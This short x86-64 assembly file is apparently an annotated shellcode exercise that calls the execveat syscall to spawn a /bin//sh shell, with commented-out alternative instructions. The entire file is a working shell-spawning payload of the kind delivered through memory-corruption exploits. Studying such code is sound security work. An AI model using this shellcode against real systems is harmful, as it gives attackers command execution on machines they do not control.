global _start			

section .text
_start:

	;push 0x42
	;pop rax
	;inc ah

	mov ax, 0x142   ;  move the HEX value 142 (322 in decimal - 'execveat' syscall number) into AX

    ;cqo
    ;push rdx

	xor rdx, rdx    ; zero out RDX
	xor r8, r8      ; zero out r8
	xor r10, r10    ; zero out r10

    push r8         ; push 0 onto the stack
	
	;mov rdi, 0x68732f2f6e69622f
	;push rdi

	mov r11, 0x68732f2f6e69622f ; move 'hs//nib/' into R11
	mov QWORD [rsp-8], r11      ; move that value into the memory address of [rsp-8]
	sub rsp, 8                  ; readjust the stack pointer manually to the start of the /bin//sh command  

	;push rsp
	;pop rsi
	
	mov rsi, rsp                ; move the address of the '/bin//sh' string into RSI

	;mov r8, rdx
	;mov r10, rdx

	syscall
